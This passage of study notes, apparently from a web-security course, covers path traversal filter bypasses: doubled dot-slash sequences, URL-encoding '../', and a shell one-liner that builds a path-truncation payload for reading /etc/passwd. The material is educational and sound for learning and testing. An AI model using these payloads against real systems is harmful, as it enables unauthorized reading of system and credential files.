	- Input: `../../etc/passwd`
	- App: `etc/passwd`
		- This will **not work**
	- Input: `....//....//etc/passwd`
	- App: `../../etc/passwd`
		- this **will work**

### Encoding
- ![](/attachments/Pasted-image-20250705185923.png)
- if `.` , `/` are being filtered out by the app, we can URL encode and use them
	- URL encode `../` into `%2e%2e%2f`

#### Path Truncation
- ![](/attachments/Pasted-image-20250705190543.png)
- Automating the creation of the payload:
```shell
echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done
```
- make sure the size of the payload is exactly 4096 characters and only the `.php` at the end would be truncated.
